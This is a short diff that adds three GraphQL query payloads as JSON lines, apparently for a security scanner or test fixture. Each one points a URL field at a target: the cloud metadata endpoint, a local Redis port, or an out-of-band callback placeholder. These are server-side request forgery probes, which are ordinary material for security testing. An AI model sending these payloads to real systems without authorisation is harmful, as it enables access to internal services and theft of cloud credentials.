@@ -1,0 +1,3 @@
+{"query":"{ import(url: \"http://169.254.169.254/latest/meta-data/\") { data } }"}
+{"query":"{ fetch(url: \"http://localhost:6379/\") { result } }"}
+{"query":"{ webhook(url: \"http://COLLABORATOR\") { status } }"}
